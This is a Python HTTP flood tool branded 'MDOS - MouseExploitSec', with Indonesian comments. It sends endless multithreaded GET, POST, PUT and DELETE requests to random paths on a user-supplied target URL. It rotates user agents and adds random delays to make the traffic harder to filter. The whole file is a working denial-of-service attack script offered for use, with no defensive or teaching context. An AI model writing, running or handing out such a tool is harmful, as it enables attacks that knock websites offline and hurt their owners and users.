import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import argparse

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

RANDOM_PATHS = [
    "/", "/about", "/contact", "/products", "/services", "/login", "/search", "/checkout"
]

def generate_random_path():
    # Menghasilkan path acak dengan panjang yang bervariasi
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "/" + "".join(random.choice(chars) for _ in range(random.randint(5, 15)))

def format_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url.rstrip("/")

def send_request(target_url):
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        path = generate_random_path()  # Menggunakan path acak yang dihasilkan
        url = target_url + path
        random_query = f"?id={random.randint(1, 100000)}&ref={random.randint(1, 1000)}"
        url += random_query
        method = random.choice(["GET", "POST", "PUT", "DELETE"])

        with requests.Session() as session:
            if method == "GET":
                response = session.get(url, headers=headers, timeout=10)
            elif method == "POST":
                response = session.post(url, headers=headers, data={"key": "value"}, timeout=10)
            elif method == "PUT":
                response = session.put(url, headers=headers, data={"key": "value"}, timeout=10)
            elif method == "DELETE":
                response = session.delete(url, headers=headers, timeout=10)

            if response.status_code != 200:
                print(Fore.RED + f"{url} Status DOWN (Code: {response.status_code})")
            else:
                print(f"Request {method} sent to {url} | Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def http_attack(target_url, thread_count, attack_duration=None):
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        try:
            while True:
                if attack_duration and (time.time() - start_time) > attack_duration:
                    print(Fore.YELLOW + "Durasi serangan selesai. Menghentikan...")
                    break
                for _ in range(thread_count):
                    executor.submit(send_request, target_url)
                time.sleep(random.uniform(0.1, 0.5))  # Menambahkan delay acak antara request
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nSerangan dihentikan oleh pengguna.")

if __name__ == "__main__":
    print(Fore.CYAN + '''
   *    (        )  (     
 (  `   )\ )  ( /(  )\ )  
 )\))( (()/(  )\())(()/(  
((_)()\ /(_))((_)\  /(_)) 
(_()((_|_))_   ((_)(_))   
|  \/  ||   \ / _ \/ __|  
| |\/| || |) | (_) \__ \  
|_|  |_||___/ \___/|___/  
>> MDOS - MouseExploitSec
    ''')

    parser = argparse.ArgumentParser(description="Alat HTTP Flood Canggih Tanpa Proxy")
    parser.add_argument("target_url", type=str, help="URL target yang akan diserang")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Jumlah thread yang digunakan")
    parser.add_argument("-d", "--duration", type=int, help="Durasi serangan dalam detik")
    args = parser.parse_args()

    target_url = format_url(args.target_url)
    thread_count = args.threads
    attack_duration = args.duration

    try:
        http_attack(target_url, thread_count, attack_duration)
    except Exception as e:
        print(Fore.RED + f"Terjadi kesalahan: {e}")
